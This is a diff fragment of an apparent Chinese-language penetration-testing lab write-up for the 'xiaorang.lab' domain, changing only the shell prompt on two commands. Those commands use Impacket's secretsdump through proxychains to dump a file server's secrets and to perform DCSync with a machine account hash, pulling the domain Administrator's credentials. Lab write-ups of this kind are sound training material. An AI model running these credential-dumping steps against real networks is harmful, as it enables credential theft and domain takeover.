@@ -281,7 +281,7 @@ flag03
 dump hash
 
 ```shell
-➜ ~ proxychains secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8
+$ proxychains secretsdump.py -k -no-pass Fileserver.xiaorang.lab -dc-ip 172.22.60.8
 Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra
 
 [*] Service RemoteRegistry is in stopped state
@@ -314,7 +314,7 @@ NL$KM:8b145159d76745809f4a544c0de1d3293eb6cc22ffb7c5747fe4b0ade7fa900d1b7720d5a6
 利用 Fileserver 机器账户进行 DCSync
 
 ```shell
-➜ ~ proxychains secretsdump.py xiaorang.lab/'Fileserver$':@172.22.60.8 -hashes ':951d8a9265dfb652f42e5c8c497d70dc' -just-dc-user Administrator
+$ proxychains secretsdump.py xiaorang.lab/'Fileserver$':@172.22.60.8 -hashes ':951d8a9265dfb652f42e5c8c497d70dc' -just-dc-user Administrator
 Impacket v0.12.0.dev1+20230803.144057.e2092339 - Copyright 2023 Fortra
 
 [*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
